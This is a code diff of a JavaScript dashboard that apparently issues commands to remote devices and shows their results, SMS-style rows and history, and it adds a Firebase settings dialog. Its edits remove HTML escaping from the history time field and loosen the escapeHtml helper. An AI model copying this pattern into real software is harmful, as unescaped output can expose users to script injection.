+                        // Split by pipe for columnar data
                         const columns = content.split('|').map(c => c.trim()).filter(c => c);
 
                         html += `<div class="struct-row" style="cursor:pointer;" onclick='showResultDetail(${escapeHtml(JSON.stringify(line.trim()))})'>`;
                         html += `<span class="struct-key" style="min-width:30px;">#${idx}</span>`;
 
+                        // Show up to 3 columns; mark long last column as sms-text style
                         const showCols = columns.slice(0, 4);
                         showCols.forEach((col, ci) => {
                             const isLast = ci === showCols.length - 1;
@@ -2403,6 +2388,7 @@
                 return html;
             }
 
+            // Fallback for non-indexed but multi-line content
             if (lines.length >= 3) {
                 let html = '<div class="ri-structured" style="max-height:250px;">';
                 lines.forEach((line, i) => {
@@ -2445,6 +2431,7 @@
             body.textContent = JSON.stringify(data, null, 2);
             modal.classList.add('open');
         } catch(e) {
+            // If it's plain text, show as-is
             const modal = document.getElementById('resultDetailModal');
             document.getElementById('rdTitle').textContent = '📄 Item Detail';
             document.getElementById('rdMeta').textContent = '';
@@ -2459,16 +2446,12 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    //  RENDER RESULTS
+    //  RENDER RESULTS — With structured output
     // ═══════════════════════════════════════════════════════
     function updateCmdResult(id, status, output) {
         const found = state.results.find(r => r.id === id);
         if (found) { found.status = status; found.output = output; }
         renderCmdResults();
-        updateCmdStatusIndicator(status);
-    }
-
-    function updateCmdStatusIndicator(status) {
         const lastStatusEl = document.getElementById('cmdLastStatus');
         if (status === 'ok') { lastStatusEl.textContent = 'OK'; lastStatusEl.className = 'value green'; }
         else if (status === 'error') { lastStatusEl.textContent = 'FAIL'; lastStatusEl.className = 'value red'; }
@@ -2534,7 +2517,7 @@
     }
 
     // ═══════════════════════════════════════════════════════
-    //  HISTORY
+    //  HISTORY TAB
     // ═══════════════════════════════════════════════════════
     async function loadFullHistory() {
         const deviceId = state.selectedDeviceId;
@@ -2590,7 +2573,7 @@
 
             toast(`📋 Loaded ${historyItems.length} history entries`, 'info');
         } catch (e) {
-            appendDiag('❌ History load error: ' + e.message);
+            appendDiag(`❌ History load error: ${e.message}`);
             document.getElementById('historyBody').innerHTML =
                 `<tr><td colspan="5" style="text-align:center;padding:40px;color:#f87171;">Error: ${escapeHtml(e.message)}</td></tr>`;
         }
@@ -2666,13 +2649,14 @@
             const paramsStr = Object.keys(h.params).length > 0
                 ? escapeHtml(JSON.stringify(h.params)).slice(0, 80)
                 : '—';
+
             const outputTruncated = h.output.length > 80
                 ? escapeHtml(h.output.slice(0, 80)) + '…'
                 : escapeHtml(h.output);
             const isLong = h.output.length > 80;
 
             return `<tr class="${rowClass}">
-                <td class="ht-time">${escapeHtml(h.timeStr)}</td>
+                <td class="ht-time">${h.timeStr}</td>
                 <td class="ht-action">${escapeHtml(h.action)}</td>
                 <td><span class="ht-status ${h.status}">${h.status}</span></td>
                 <td style="font-size:11px;color:#6b7280;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${escapeHtml(paramsStr)}">${paramsStr}</td>
@@ -2692,6 +2676,40 @@
         if (btn) btn.textContent = el.classList.contains('expanded') ? 'collapse' : 'expand';
     }
 
+    // ═══════════════════════════════════════════════════════
+    //  SETTINGS
+    // ═══════════════════════════════════════════════════════
+    function openSettings() {
+        const cfg = getConfig();
+        document.getElementById('cfg_apiKey').value = cfg.apiKey || '';
+        document.getElementById('cfg_authDomain').value = cfg.authDomain || '';
+        document.getElementById('cfg_projectId').value = cfg.projectId || '';
+        document.getElementById('cfg_storageBucket').value = cfg.storageBucket || '';
+        document.getElementById('cfg_messagingSenderId').value = cfg.messagingSenderId || '';
+        document.getElementById('cfg_appId').value = cfg.appId || '';
+        document.getElementById('settingsModal').classList.add('open');
+    }
+    function closeSettings() { document.getElementById('settingsModal').classList.remove('open'); }
+    function saveSettingsAndReconnect() {
+        const config = {
+            apiKey: document.getElementById('cfg_apiKey').value.trim(),
+            authDomain: document.getElementById('cfg_authDomain').value.trim(),
+            projectId: document.getElementById('cfg_projectId').value.trim(),
+            storageBucket: document.getElementById('cfg_storageBucket').value.trim(),
+            messagingSenderId: document.getElementById('cfg_messagingSenderId').value.trim(),
+            appId: document.getElementById('cfg_appId').value.trim(),
+        };
+        if (!config.apiKey || !config.projectId) { toast('API Key and Project ID required', 'error'); return; }
+        localStorage.setItem('mc_firebase_config', JSON.stringify(config));
+        closeSettings();
+        toast('Config saved. Reloading…', 'info');
+        setTimeout(() => location.reload(), 500);
+    }
+    document.getElementById('settingsModal').addEventListener('click', function(e) { if (e.target === this) closeSettings(); });
+
+    // ═══════════════════════════════════════════════════════
+    //  UTILITY
+    // ═══════════════════════════════════════════════════════
     function toast(msg, type) {
         const c = document.getElementById('toastContainer');
         const el = document.createElement('div');
@@ -2700,8 +2718,7 @@
         c.appendChild(el);
         setTimeout(() => { el.style.opacity = '0'; el.style.transform = 'translateX(20px)'; el.style.transition = 'all 0.3s'; setTimeout(() => el.remove(), 300); }, 4000);
     }
-
-    function escapeHtml(s) { if (!s) return ''; const d = document.createElement('div'); d.textContent = String(s); return d.innerHTML; }
+    function escapeHtml(s) { if (!s) return ''; const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
 </script>
 </body>
 </html>
